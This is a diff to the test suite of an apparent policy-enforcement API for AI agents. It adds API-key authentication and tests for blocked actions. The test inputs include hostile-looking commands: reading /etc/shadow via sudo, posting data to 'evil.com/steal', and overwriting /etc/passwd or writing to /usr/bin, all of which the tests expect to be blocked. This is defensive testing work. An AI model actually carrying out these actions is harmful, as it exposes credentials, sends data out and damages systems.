@@ -96,14 +96,17 @@ after(async () => {
 // ─── API Health & Root ────────────────────────────────────────────────────────
 
 describe('API Health & Root', () => {
-  it('GET /health returns 200 with status ok', async () => {
+  it('GET /health returns 200 with status ok (no sensitive data)', async () => {
     const res = await request('GET', '/health');
     assert.equal(res.status, 200);
     assert.equal(res.body['status'], 'ok');
-    assert.equal(res.body['engine'], 'agentguard');
-    assert.ok(typeof res.body['uptime'] === 'number');
-    assert.ok('killSwitch' in res.body);
-    assert.equal(res.body['db'], 'sqlite');
+    assert.equal(res.body['version'], '0.6.0');
+    // Sensitive fields must NOT be present in public health endpoint
+    assert.ok(!('engine' in res.body), 'engine should not be exposed');
+    assert.ok(!('uptime' in res.body), 'uptime should not be exposed');
+    assert.ok(!('db' in res.body), 'db type should not be exposed');
+    assert.ok(!('tenants' in res.body), 'tenant count should not be exposed');
+    assert.ok(!('activeAgents' in res.body), 'agent count should not be exposed');
   });
 
   it('GET / returns API directory', async () => {
@@ -189,10 +192,10 @@ describe('Signup Flow', () => {
 
 describe('Policy Evaluation', () => {
   it('POST /api/v1/evaluate blocks privilege escalation (sudo)', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'sudo',
-      params: { command: 'cat /etc/shadow' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'sudo', params: { command: 'cat /etc/shadow' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'block');
     assert.equal(res.body['matchedRuleId'], 'block-privilege-escalation');
@@ -201,54 +204,57 @@ describe('Policy Evaluation', () => {
   });
 
   it('POST /api/v1/evaluate blocks shell_exec', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { tool: 'shell_exec' });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'shell_exec' },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'block');
   });
 
   it('POST /api/v1/evaluate blocks external HTTP requests', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'http_post',
-      params: { destination: 'https://evil.com/steal', body: 'data' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'http_post', params: { destination: 'https://evil.com/steal', body: 'data' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'block');
     assert.equal(res.body['matchedRuleId'], 'block-external-http');
   });
 
   it('POST /api/v1/evaluate allows safe read operations', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'file_read',
-      params: { path: '/reports/q4.csv' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'file_read', params: { path: '/reports/q4.csv' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'allow');
     assert.equal(res.body['matchedRuleId'], 'allow-read-operations');
   });
 
   it('POST /api/v1/evaluate allows list_files', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'list_files',
-      params: { directory: '/reports/' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'list_files', params: { directory: '/reports/' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'allow');
   });
 
   it('POST /api/v1/evaluate blocks PII table access', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'db_query',
-      params: { table: 'users', query: 'SELECT *' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'db_query', params: { table: 'users', query: 'SELECT *' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'block');
     assert.equal(res.body['matchedRuleId'], 'block-pii-tables');
   });
 
-  it('POST /api/v1/evaluate works without auth (demo mode)', async () => {
+  it('POST /api/v1/evaluate returns 401 without auth (auth required)', async () => {
     const res = await request('POST', '/api/v1/evaluate', { tool: 'file_read' });
-    assert.equal(res.status, 200);
-    assert.ok(['allow', 'block', 'monitor', 'require_approval'].includes(res.body['result'] as string));
+    assert.equal(res.status, 401);
+    assert.ok(typeof res.body['error'] === 'string');
   });
 
   it('POST /api/v1/evaluate works with valid API key (tenant mode)', async () => {
@@ -261,30 +267,58 @@ describe('Policy Evaluation', () => {
   });
 
   it('POST /api/v1/evaluate rejects missing tool with 400', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { params: { foo: 'bar' } });
+    const res = await request('POST', '/api/v1/evaluate',
+      { params: { foo: 'bar' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 400);
     assert.ok(typeof res.body['error'] === 'string');
   });
 
   it('POST /api/v1/evaluate rejects non-string tool with 400', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { tool: 42 });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 42 },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 400);
   });
 
   it('POST /api/v1/evaluate blocks destructive operations', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { tool: 'file_delete' });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'file_delete' },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'block');
     assert.equal(res.body['matchedRuleId'], 'block-destructive-ops');
   });
 
   it('POST /api/v1/evaluate requires_approval for high-value transactions', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {
-      tool: 'execute_transaction',
-      params: { amount: 50000, recipient: 'vendor-123' },
-    });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'execute_transaction', params: { amount: 50000, recipient: 'vendor-123' } },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 200);
     assert.equal(res.body['result'], 'require_approval');
+  });
+
+  it('POST /api/v1/evaluate blocks file_write to /etc/passwd', async () => {
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'file_write', params: { path: '/etc/passwd', content: 'root:hacked' } },
+      { 'X-API-Key': apiKey },
+    );
+    assert.equal(res.status, 200);
+    assert.equal(res.body['result'], 'block');
+    assert.equal(res.body['matchedRuleId'], 'block-system-path-writes');
+  });
+
+  it('POST /api/v1/evaluate blocks write_file to /usr/bin/', async () => {
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'write_file', params: { path: '/usr/bin/malware', content: '...' } },
+      { 'X-API-Key': apiKey },
+    );
+    assert.equal(res.status, 200);
+    assert.equal(res.body['result'], 'block');
   });
 });
 
@@ -376,10 +410,18 @@ describe('Kill Switch', () => {
   });
 
   it('Tenant kill switch does not affect other tenants (tenant isolation)', async () => {
-    // Demo mode (no API key) should not be blocked by this tenant's kill switch
-    const res = await request('POST', '/api/v1/evaluate', { tool: 'file_read' });
+    // A second tenant's key should not be blocked by the first tenant's kill switch
+    const signupRes = await request('POST', '/api/v1/signup', {
+      name: 'Kill Switch Isolation Corp',
+      email: `ks-isolation-${Date.now()}@agentguard-test.local`,
+    });
+    const isolationApiKey = signupRes.body['apiKey'] as string;
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'file_read' },
+      { 'X-API-Key': isolationApiKey },
+    );
     assert.equal(res.status, 200);
-    // Should evaluate normally — not hit kill switch
+    // Should evaluate normally — not hit the other tenant's kill switch
     assert.notEqual(res.body['matchedRuleId'], 'TENANT_KILL_SWITCH');
   });
 
@@ -454,7 +496,7 @@ describe('Input Validation', () => {
   it('POST /api/v1/evaluate with bad JSON returns 400', async () => {
     const res = await fetch(`${BASE}/api/v1/evaluate`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey },
       body: '{ invalid json >>>',
     });
     // Express should return 400 for malformed JSON
@@ -462,18 +504,27 @@ describe('Input Validation', () => {
   });
 
   it('POST /api/v1/evaluate with empty body returns 400', async () => {
-    const res = await request('POST', '/api/v1/evaluate', {});
+    const res = await request('POST', '/api/v1/evaluate',
+      {},
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 400);
     assert.ok(typeof res.body['error'] === 'string');
   });
 
   it('POST /api/v1/evaluate with missing tool field returns 400', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { params: {} });
+    const res = await request('POST', '/api/v1/evaluate',
+      { params: {} },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 400);
   });
 
   it('POST /api/v1/evaluate with tool too long returns 400', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { tool: 'a'.repeat(201) });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'a'.repeat(201) },
+      { 'X-API-Key': apiKey },
+    );
     assert.equal(res.status, 400);
     assert.match(res.body['error'] as string, /too long/i);
   });
@@ -484,6 +535,20 @@ describe('Input Validation', () => {
       email: `empty-name-${Date.now()}@test.local`,
     });
     assert.equal(res.status, 400);
+  });
+
+  it('POST /api/v1/evaluate with oversized payload returns 413 (not 500)', async () => {
+    // Generate a payload larger than the 50kb limit
+    const bigPayload = JSON.stringify({
+      tool: 'file_read',
+      params: { data: 'x'.repeat(60 * 1024) }, // 60kb
+    });
+    const res = await fetch(`${BASE}/api/v1/evaluate`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey },
+      body: bigPayload,
+    });
+    assert.equal(res.status, 413, `expected 413, got ${res.status}`);
   });
 });
 
@@ -511,7 +576,10 @@ describe('Security Headers', () => {
   });
 
   it('Rate limit headers present on /api/v1/evaluate', async () => {
-    const res = await request('POST', '/api/v1/evaluate', { tool: 'file_read' });
+    const res = await request('POST', '/api/v1/evaluate',
+      { tool: 'file_read' },
+      { 'X-API-Key': apiKey },
+    );
     assert.ok(
       'x-ratelimit-limit' in res.headers || 'x-ratelimit-remaining' in res.headers,
       'should include rate limit headers',
@@ -602,7 +670,7 @@ describe('Playground Flow', () => {
     assert.ok(typeof policy['ruleCount'] === 'number');
     assert.ok((policy['ruleCount'] as number) > 0);
     assert.ok(Array.isArray(policy['rules']));
-    assert.ok(['allow', 'block'].includes(policy['default'] as string));
+    assert.ok(['allow', 'block', 'monitor'].includes(policy['default'] as string));
   });
 
   it('POST /api/v1/playground/evaluate evaluates with session tracking', async () => {
